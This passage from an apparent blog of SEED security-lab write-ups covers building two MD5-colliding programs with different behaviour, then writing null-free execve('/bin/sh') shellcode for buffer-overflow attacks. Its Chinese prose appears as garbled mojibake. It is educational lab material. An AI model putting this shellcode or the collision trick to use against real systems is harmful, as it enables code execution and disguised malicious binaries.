class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell">[06/14/23]seed@VM:~$ head -c 12324 a.out &gt; prefix<br>[06/14/23]seed@VM:~$ tail -c 12353 a.out &gt; suffix<br>[06/14/23]seed@VM:~$ md5collgen -p prefix -o p1.bin p2.bin <br>MD5 collision generator v1.5<br>by Marc Stevens (http://www.win.tue.nl/hashclash/)<br><br>Using output filenames: &#x27;p1.bin&#x27; and &#x27;p2.bin&#x27;<br>Using prefixfile: &#x27;prefix&#x27;<br>Using initial value: 6a415b5a106e730948ad2d1abe26cfd3<br><br>Generating first block: ...<br>Generating second block: W.....................<br>Running time: 1.83808 s<br>[06/14/23]seed@VM:~$ cat suffix &gt;&gt; p1.bin <br>[06/14/23]seed@VM:~$ cat suffix &gt;&gt; p2.bin <br>[06/14/23]seed@VM:~$ sudo chmod +x p1.bin p2.bin <br>[06/14/23]seed@VM:~$ ./p1.bin <br>41414141000000000000000000000000000020f253f1bb456b3ce9be3d814456444d94d868c31d7c42867c924cae99a6fdb9cadf6aadc120e7634a1bfec34f10d8ffe44eced2944d8a99ae965727c48fbcad2e235596e0eb6c4c961fcfa440ce86b2ba4825b44d22393e17cba614ce856f3656b790be8be81c1a99840595dc448dc9bc0d27393e6244377e0bf614a89e741ff14df4883c314839dd75ea4883c485b5d415c415d415e415fc366662ef1f840000<br>[06/14/23]seed@VM:~$ ./p2.bin <br>41414141000000000000000000000000000020f253f1bb456b3ce9be3d814456444d945868c31d7c42867c924cae99a6fdb9cadf6aadc120e7634a1bfe435010d8ffe44eced2944d8a99ae165727c48fbcad2e235596e0eb6c4c961fcfa440ce86b2bac825b44d22393e17cba614ce856f3656b790be8be81c1a998c0585dc448dc9bc0d27393e62443f7e0bf614a89e741ff14df4883c314839dd75ea4883c485b5d415c415d415e415fc366662ef1f840000<br>[06/14/23]seed@VM:~$ md5sum p1.bin p2.bin <br>0a0c4456dec1a3c45c7b382613cc71ad  p1.bin<br>0a0c4456dec1a3c45c7b382613cc71ad  p2.bin<br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œåˆ›å»ºäº†ä¸¤ä¸ªå…·æœ‰ç›¸åŒ MD5æ•£åˆ—çš„ç¨‹åºï¼Œå®ƒä»¬ä¹‹é—´çš„åŒºåˆ«ä»…ä»…åœ¨äºå®ƒä»¬æ‰“å°å‡ºæ¥çš„æ•°æ®</p><p><img src="https://img.gls.show/img/image-20230615005533457.png" alt="image-20230615005533457"></p><h1 id="Task-4-Making-the-Two-Programs-Behave-Differently"><a href="#Task-4-Making-the-Two-Programs-Behave-Differently" class="headerlink" title="Task 4: Making the Two Programs Behave Differently"></a>Task 4: Making the Two Programs Behave Differently</h1><p>åˆ›å»ºä¸¤ä¸ªå…±äº«ç›¸åŒ MD5æ•£åˆ—çš„ç¨‹åºã€‚ä¸€ä¸ªç¨‹åºå°†å§‹ç»ˆæ‰§è¡Œæ­£å¸¸æŒ‡ä»¤ï¼Œè€Œå¦ä¸€ä¸ªç¨‹åºå°†æ‰§è¡Œæ¶æ„æŒ‡ä»¤</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> x[<span class="hljs-number">200</span>] = &#123;<br><span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span><br><br>&#125;;<br><br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> y[<span class="hljs-number">200</span>] = &#123;<br>    <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>,<br>    <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>,<br>    <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>,<br>    <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span><br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> i;<br>  <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">200</span>; i++)&#123;<br>    <span class="hljs-keyword">if</span>(x[i] != y[i])&#123; <span class="hljs-keyword">break</span>; &#125;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span>(i == <span class="hljs-number">200</span>)&#123; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, <span class="hljs-string">&quot;benign code&quot;</span>); &#125; <span class="hljs-comment">/* x = y */</span><br>  <span class="hljs-keyword">else</span>&#123; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, <span class="hljs-string">&quot;WARNING: malicious code&quot;</span>); &#125; <span class="hljs-comment">/* x != y */</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å°†ä¸Šé¢æºç ç¼–è¯‘ä¸ºa.outæ–‡ä»¶</p><p>12320åç§»å¤„å‡ºç°äº†AAAAï¼Œè¯´æ˜è¿™é‡Œæ˜¯xæ•°ç»„å¼€å§‹å¤„</p><p>å°†å‰12324ä¸ªbytesä½œä¸ºprefixï¼Œç”Ÿæˆmd5ç¢°æ’çš„p1 p2 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> head -c 12324 a.out &gt; prefix</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> md5collgen -p prefix -o p1 p2</span><br>MD5 collision generator v1.5<br>by Marc Stevens (http://www.win.tue.nl/hashclash/)<br><br>Using output filenames: &#x27;p1&#x27; and &#x27;p2&#x27;<br>Using prefixfile: &#x27;prefix&#x27;<br>Using initial value: 378d43f1d8999353cc974181bbf31423<br><br>Generating first block: ...<br>Generating second block: S11.......................<br>Running time: 2.85953 s<br></code></pre></td></tr></table></figure><p><img src="https://img.gls.show/img/image-20230616022632664.png" alt="image-20230616022632664"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œa.outçš„Açš„æ•°æ®åŒºæœ‰0xe0ä¸ªæ•°æ®</p><p>æ‰“å¼€p1çš„blessï¼Œå°†Açš„æ•°æ®åŒºå¡«å……åˆ°0xe0ä¸ªæ•°æ®ï¼ˆå‘ç°éœ€è¦64ä¸ª0ï¼Œè¿™é‡Œæˆ‘ç›´æ¥åœ¨zeroæ–‡ä»¶ä¸­å†™å…¥63ä¸ª0ï¼ŒåŠ ä¸Š0Aæ­£å¥½æ˜¯64ï¼‰</p><p><img src="https://img.gls.show/img/image-20230616022901794.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;$(python3 -c &#x27;print(&quot;A&quot;*63)&#x27;)&quot; &gt; zero<br><br>[06/15/23]seed@VM:~$ cat zero &gt;&gt; p1 <br>[06/15/23]seed@VM:~$ cat zero &gt;&gt; p2 <br></code></pre></td></tr></table></figure><p>ä¹‹åå°†a.outä¸­Bçš„æ•°æ®åŒºä¹‹åçš„å†…å®¹æ¥åˆ°p1ã€p2çš„æœ«å°¾å³å¯</p><p><img src="https://img.gls.show/img/image-20230616023556027.png"></p><p>å‘ç°p1ã€p2çš„å†…å®¹md5å€¼ç›¸åŒï¼Œä½†æ˜¯è¿è¡Œç»“æœä¸åŒ</p>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-labï¼šShellcode Development Lab</title>
    <link href="/p/a10ed24d/"/>
    <url>/p/a10ed24d/</url>
    
    <content type="html"><![CDATA[<p><img src="https://gls.show/image/shellshock.png"></p><h1 id="Task-1-a"><a href="#Task-1-a" class="headerlink" title="Task 1.a"></a>Task 1.a</h1><p>é¦–å…ˆæ¥çœ‹ä¸€ä¸‹Cè¯­è¨€ç‰ˆæœ¬çš„shellcodeï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    <span class="hljs-keyword">char</span> *argv[2]</span>;<br>    argv[<span class="hljs-number">0</span>]=<span class="hljs-string">&quot;/bin/sh&quot;</span>;<br>    argv[<span class="hljs-number">1</span>]=<span class="hljs-literal">NULL</span>;<br>    execve (argv[<span class="hljs-number">0</span>],argv,<span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸‹é¢æ±‡ç¼–ä»£ç å¯ä»¥å¯åŠ¨ä¸€ä¸ªshellï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs asm">section .text<br>  global _start<br>    _start:<br>      ; Store the argument string on stack<br>      xor  eax, eax <br>      push eax          ; Use 0 to terminate the string<br>      push &quot;//sh&quot;<br>      push &quot;/bin&quot;<br>      mov  ebx, esp     ; Get the string address<br><br>      ; Construct the argument array argv[]<br>      push eax          ; argv[1] = 0<br>      push ebx          ; argv[0] points &quot;/bin//sh&quot;<br>      mov  ecx, esp     ; Get the address of argv[]<br>   <br>      ; For environment variable <br>      xor  edx, edx     ; No env variables <br><br>      ; Invoke execve()<br>      xor  eax, eax     ; eax = 0x00000000<br>      mov   al, 0x0b    ; eax = 0x0000000b<br>      int 0x80<br></code></pre></td></tr></table></figure><p>å‡ ç‚¹è§£é‡Šï¼š</p><ul><li></li></ul><p>ä½¿ç”¨nasm ç¼–è¯‘ä¸Šé¢çš„æ±‡ç¼–ä»£ç (mysh.s) </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> nasm <span class="hljs-operator">-f</span> elf32 mysh.s <span class="hljs-literal">-o</span> mysh.o<br></code></pre></td></tr></table></figure><blockquote><p>nasm æ˜¯ç”¨äº Intel x86å’Œ x64æ¶æ„çš„æ±‡ç¼–å’Œåæ±‡ç¼–ç¨‹åºã€‚-f elf32é€‰é¡¹è¡¨æ˜æˆ‘ä»¬å¸Œæœ›å°†ä»£ç ç¼–è¯‘ä¸º32ä½ ELF äºŒè¿›åˆ¶æ ¼å¼</p></blockquote><p>æå‡ºç¨‹åºçš„ç”Ÿå‘½å‘¨æœŸå›¾ï¼Œå¯ä»¥æ›´å¥½çš„ç†è§£nasmå·¥ä½œåŸç†</p><p><img src="https://gls.show/image/31h00bitb5.jpg"></p><p>é€šè¿‡é“¾æ¥å¾—åˆ°å¯æ‰§è¡Œæ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ld -m elf_i386 mysh.o -o mysh</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡<code>./mysh</code>å¯åŠ¨shellï¼Œç„¶åä½¿ç”¨<code>echo $$</code>å¾—åˆ°ç›®å‰è¿›ç¨‹çš„idï¼Œä»è€ŒéªŒè¯æ˜¯å¦æˆåŠŸå¼€å¯äº†shell</p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦ä»å¯æ‰§è¡Œæ–‡ä»¶æˆ–ç›®æ ‡æ–‡ä»¶ä¸­æå–æœºå™¨ä»£ç ï¼ˆmachine codeï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> objdump -Mintel --disassemble mysh.o</span><br><br>mysh.o:     file format elf32-i386<br><br><br>Disassembly of section .text:<br><br>00000000 &lt;_start&gt;:<br>   0:31 c0                xor    eax,eax<br>   2:50                   push   eax<br>   3:68 2f 2f 73 68       push   0x68732f2f<br>   8:68 2f 62 69 6e       push   0x6e69622f<br>   d:89 e3                mov    ebx,esp<br>   f:50                   push   eax<br>  10:53                   push   ebx<br>  11:89 e1                mov    ecx,esp<br>  13:31 d2                xor    edx,edx<br>  15:31 c0                xor    eax,eax<br>  17:b0 0b                mov    al,0xb<br>  19:cd 80                int    0x80<br></code></pre></td></tr></table></figure><ul><li>-Mintelè¡¨ç¤ºæ˜¾ç¤ºIntelæ ¼å¼çš„æ±‡ç¼–ä»£ç ï¼Œè€Œéé»˜è®¤çš„ATTæ ¼å¼</li><li>â€“disassembleè¡¨ç¤ºåæ±‡ç¼–ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨-dä»£æ›¿</li></ul><p>å¯ä»¥ä½¿ç”¨xxdå‘½ä»¤è·å–äºŒè¿›åˆ¶åºåˆ—</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> xxd -p -c 20 mysh.o</span><br><br>7f454c4601010100000000000000000001000300<br>0100000000000000000000004000000000000000<br>3400000000002800050002000000000000000000<br>0000000000000000000000000000000000000000<br>0000000000000000000000000000000000000000<br>0000000001000000010000000600000000000000<br>100100001b000000000000000000000010000000<br>0000000007000000030000000000000000000000<br>3001000021000000000000000000000001000000<br>0000000011000000020000000000000000000000<br>6001000040000000040000000300000004000000<br>1000000019000000030000000000000000000000<br>a00100000f000000000000000000000001000000<br>00000000000000000000000031c050682f2f7368<br>682f62696e89e3505389e131d231c0b00bcd8000<br>00000000002e74657874002e7368737472746162<br>002e73796d746162002e73747274616200000000<br>0000000000000000000000000000000000000000<br>0000000000000000010000000000000000000000<br>0400f1ff00000000000000000000000003000100<br>08000000000000000000000010000100006d7973<br>682e73005f73746172740000<br></code></pre></td></tr></table></figure><ul><li>-pè¡¨ç¤ºåˆ—ä¹‹é—´ä¸éœ€è¦ç©ºæ ¼</li><li>-c 20è¡¨ç¤ºä¸€è¡Œæœ‰20ä¸ªå­—ç¬¦</li></ul><p>æå–å‡ºæˆ‘ä»¬éœ€è¦çš„äºŒè¿›åˆ¶åºåˆ—ï¼š</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">31</span><span class="hljs-keyword">c</span><span class="hljs-number">050682</span>f<span class="hljs-number">2</span>f<span class="hljs-number">7368</span><br><span class="hljs-number">682</span>f<span class="hljs-number">62696e89</span>e<span class="hljs-number">3505389e131</span>d<span class="hljs-number">231</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>b<span class="hljs-number">00</span>bcd<span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨conver.pyå¾—åˆ°äºŒè¿›åˆ¶æ•°ç»„</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./convert.py</span><br>Length of the shellcode: 35<br>shellcode= (<br>    &quot;\x31\xdb\x31\xc0\xb0\xd5\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68&quot;<br>    &quot;\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0&quot;<br>    &quot;\x0b\xcd\x80&quot;<br>).encode(â€™latin-1â€™)<br></code></pre></td></tr></table></figure><h1 id="Task-1-b"><a href="#Task-1-b" class="headerlink" title="Task 1.b"></a>Task 1.b</h1><blockquote><p>Shellcode å¹¿æ³›åº”ç”¨äºç¼“å†²åŒºæº¢å‡ºæ”»å‡»ã€‚åœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œæ¼æ´æ˜¯ç”±å­—ç¬¦ä¸²å¤åˆ¶å¼•èµ·çš„ï¼Œä¾‹å¦‚ strcpy ()å‡½æ•°ã€‚å¯¹äºè¿™äº›å­—ç¬¦ä¸²å¤åˆ¶å‡½æ•°ï¼Œé›¶è¢«è®¤ä¸ºæ˜¯å­—ç¬¦ä¸²çš„æœ«å°¾ã€‚å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬åœ¨ shell ä»£ç çš„ä¸­é—´æœ‰ä¸€ä¸ªé›¶ï¼Œå­—ç¬¦ä¸²å¤åˆ¶å°†ä¸èƒ½å°†é›¶åé¢çš„ä»»ä½•å†…å®¹ä»è¿™ä¸ª shell ä»£ç å¤åˆ¶åˆ°ç›®æ ‡ç¼“å†²åŒºï¼Œå› æ­¤æ”»å‡»å°†ä¸èƒ½æˆåŠŸ</p></blockquote><p>å› æ­¤æˆ‘ä»¬æœ‰å¿…è¦å°†ä¸Šé¢äºŒè¿›åˆ¶åºåˆ—çš„0å»é™¤</p><p>ä¸€äº›å»0çš„æ–¹æ³•ï¼š</p><ul><li><p>ä½¿ç”¨<code>xor eaxï¼Œeax</code>å»å–ä»£<code>mov eax, 0</code></p></li><li><p>å¦‚æœæˆ‘ä»¬è¦å­˜å‚¨0x0000099åˆ° eaxã€‚æˆ‘ä»¬ä¸èƒ½åªä½¿ç”¨ mov eaxï¼Œ0x99ï¼Œå› ä¸ºç¬¬äºŒä¸ªæ“ä½œæ•°å®é™…ä¸Šæ˜¯0x0000099ï¼Œå®ƒåŒ…å«ä¸‰ä¸ªé›¶</p><ul><li>é¦–å…ˆå°† eax è®¾ç½®ä¸ºé›¶ï¼Œç„¶åä¸º al å¯„å­˜å™¨åˆ†é…ä¸€ä¸ª1å­—èŠ‚çš„æ•°å­—0x99</li></ul></li><li><p>ä½¿ç”¨ç§»ä½æ“ä½œ</p><ul><li>ä¸‹é¢æ“ä½œç­‰ä»·äºå°†<code>xyz\0</code>èµ‹ç»™ebx</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov ebx, &quot;xyz#&quot;<br>shl ebx, 8<br>shr ebx, 8<br></code></pre></td></tr></table></figure></li></ul><p>æ¥ä¸‹æ¥åˆ°äº†ç¬¬ä¸€ä¸ªä»»åŠ¡ï¼Œæˆ‘ä»¬éœ€è¦æ‰§è¡Œ/bin/bashï¼Œå¹¶ä¸”ä¸å¯ä»¥æœ‰å¤šä½™çš„/</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs asm">section .text<br><br>  global _start<br>    _start:<br>      ; Store the argument string on stack<br>      xor  eax, eax<br>      push eax          ; Use 0 to terminate the string<br>        mov ebx,&quot;hhhh&quot;<br>        shl ebx, 24<br>        shr ebx, 24<br>        push ebx<br>      push &quot;/bas&quot;<br>      push &quot;/bin&quot;<br>      mov  ebx, esp     ; Get the string address<br>      ; Construct the argument array argv[]<br>      push eax          ; argv[1] = 0<br>      push ebx          ; argv[0] points &quot;/bin//sh&quot;<br>      mov  ecx, esp     ; Get the address of argv[]<br><br>      ; For environment variable <br>      xor  edx, edx     ; No env variables <br><br>      ; Invoke execve()<br>      xor  eax, eax     ; eax = 0x00000000<br>      mov   al, 0x0b    ; eax = 0x0000000b<br>      int 0x80<br><br></code></pre></td></tr></table></figure><ul><li>æˆ‘ä»¬éœ€è¦æ„é€ å‡º/bin/bash\0çš„å­—ç¬¦ä¸²</li><li>ç”±äºç›´æ¥ä½¿ç”¨0ä¼šå¯¼è‡´strcpyå¤±è´¥ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ç§»ä½æ“ä½œè·å–0</li><li>æ³¨æ„åˆ°pushçš„æ“ä½œæ•°åªèƒ½æ˜¯32ä½/64æ•°</li></ul><p>åæ±‡ç¼–çœ‹ä¸€ä¸‹ç»“æœï¼Œæ²¡æœ‰0å­—èŠ‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00000000</span> &lt;_start&gt;:<br>   <span class="hljs-attribute">0</span>:<span class="hljs-number">31</span> c<span class="hljs-number">0</span>                xor    eax,eax<br>   <span class="hljs-attribute">2</span>:<span class="hljs-number">50</span>                   push   eax<br>   <span class="hljs-attribute">3</span>:bb <span class="hljs-number">68</span> <span class="hljs-number">68</span> <span class="hljs-number">68</span> <span class="hljs-number">68</span>       mov    ebx,<span class="hljs-number">0</span>x<span class="hljs-number">68686868</span><br>   <span class="hljs-attribute">8</span>:c<span class="hljs-number">1</span> e<span class="hljs-number">3</span> <span class="hljs-number">18</span>             shl    ebx,<span class="hljs-number">0</span>x<span class="hljs-number">18</span><br>   <span class="hljs-attribute">b</span>:c<span class="hljs-number">1</span> eb <span class="hljs-number">18</span>             shr    ebx,<span class="hljs-number">0</span>x<span class="hljs-number">18</span><br>   <span class="hljs-attribute">e</span>:<span class="hljs-number">53</span>                   push   ebx<br>   <span class="hljs-attribute">f</span>:<span class="hljs-number">68</span> <span class="hljs-number">2</span>f <span class="hljs-number">62</span> <span class="hljs-number">61</span> <span class="hljs-number">73</span>       push   <span class="hljs-number">0</span>x<span class="hljs-number">7361622</span>f<br>  <span class="hljs-attribute">14</span>:<span class="hljs-number">68</span> <span class="hljs-number">2</span>f <span class="hljs-number">62</span> <span class="hljs-number">69</span> <span class="hljs-number">6</span>e       push   <span class="hljs-number">0</span>x<span class="hljs-number">6</span>e<span class="hljs-number">69622</span>f<br>  <span class="hljs-attribute">19</span>:<span class="hljs-number">89</span> e<span class="hljs-number">3</span>                mov    ebx,esp<br>  <span class="hljs-attribute">1b</span>:<span class="hljs-number">50</span>                   push   eax<br>  <span class="hljs-attribute">1c</span>:<span class="hljs-number">53</span>                   push   ebx<br>  <span class="hljs-attribute">1d</span>:<span class="hljs-number">89</span> e<span class="hljs-number">1</span>                mov    ecx,esp<br>  <span class="hljs-attribute">1f</span>:<span class="hljs-number">31</span> d<span class="hljs-number">2</span>                xor    edx,edx<br>  <span class="hljs-attribute">21</span>:<span class="hljs-number">31</span> c<span class="hljs-number">0</span>                xor    eax,eax<br>  <span class="hljs-attribute">23</span>:b<span class="hljs-number">0</span> <span class="hljs-number">0</span>b                mov    al,<span class="hljs-number">0</span>xb<br>  <span class="hljs-attribute">25</span>:cd <span class="hljs-number">80</span>                int    <span class="hljs-number">0</span>x<span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><h1 id="Task-1-c"><a href="#Task-1-c" class="headerlink" title="Task 1.c"></a>Task 1.c</h1><p>ä½¿ç”¨execveå®ç°ä»¥ä¸‹å‘½ä»¤çš„æ‰§è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">/bin/sh -c &quot;ls -la&quot;<br></code></pre></td></tr></table></figure><p>æ±‡ç¼–ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 